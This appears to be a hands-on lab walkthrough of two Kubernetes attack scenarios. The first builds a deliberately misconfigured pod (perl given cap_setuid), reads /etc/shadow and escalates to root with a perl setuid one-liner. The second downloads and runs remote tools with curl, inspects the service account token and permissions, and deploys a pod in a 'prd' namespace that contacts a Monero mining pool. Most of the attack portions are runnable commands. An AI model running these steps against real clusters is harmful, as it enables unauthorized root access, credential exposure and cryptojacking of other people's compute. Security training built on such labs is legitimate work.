# Scenario 1: Perform privilege escalation 

## setup the environment

1- create pod :

```bash
cd /tmp; cat > dev-dashboard.yml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: dev-dashboard
  labels:
    app: dev-dashboard
spec:
  containers:
  - name: dev-dashboard
#    securityContext:
#      runAsUser: 10000
#      runAsGroup: 10000
    image: ubuntu:latest
    command: ["/bin/sleep", "3650d"]
    imagePullPolicy: IfNotPresent
  restartPolicy: Always
EOF
```

2- deploy the pod 

```bash
kubectl apply -f dev-dashboard.yml
```

3- access the new pod 

```bash
kubectl exec -it dev-dashboard -- bash
```

4- install some additoin 

```bash
apt update
apt install curl -y 
apt install  libcap2-bin -y 
apt install sudo -y
```

5- set up Perl command with administrative rights.

```bash
setcap cap_setuid+ep /usr/bin/perl
```

6- create new user 

```bash 
adduser demo
```

## starting the attack

Information-gathering:

```bash
id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube
```

```bash
cat /etc/shadow
ls -l /root 
ls -l /home
```

Display the capabilities /check the files that have setuid permission 

```bash
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
sudo -l
```
in this case, the binary /usr/bin/perl has the SUID set.

privilage escalation

Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.

```bash
./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

# Scenario 2: Cryptomining

Information-gathering:

```bash
id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube
```

```bash
cat /etc/shadow
ls -l /root 
ls -l /home
```

```bash
ln -s /etc/shadow sh-link
```

Here we download and run a basic Linux config auditor to see if it finds any obvious opportunities. 
``` bash
cd /tmp; curl http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard
```

Is it a container? 
amicontainer —> is a container introspection tool that lets you find out what container runtime is being used as well as the features available.

```bash
cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained
```

Now let's inspect our Kubernetes environment:

```bash
env | grep -i kube
```
```bash
curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
```
```bash
ls /var/run/secrets/kubernetes.io/serviceaccount
```
We have typical Kubernetes-related environment variables defined, let's see if the Kubernetes security configuration is sloppy.

```bash
export PATH=/tmp:$PATH
cd /tmp; curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl; chmod 555 kubectl
```

```bash
kubectl get all
```

By default, kubectl will attempt to use the default service account in /var/run/secrets/kubernetes.io/serviceaccount -- and it looks like this one has some API access

- Let's inspect what all we can do:

```bash
kubectl auth can-i --list
```

```bash
kubectl auth can-i create pods
```
```bash
cd /tmp; cat > crypto.yml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: crypto
  namespace: prd
  labels:
    app: crypto
spec:
  containers:
  - name: crypto
    image: ubuntu:latest
    command: ["/bin/sh"]
    args: ["-c", "apt update && apt install curl -y && curl pool.minexmr.com"]
    imagePullPolicy: IfNotPresent
  restartPolicy: Always
EOF
./kubectl apply -f crypto.yml
sleep 10
./kubectl get pods
```
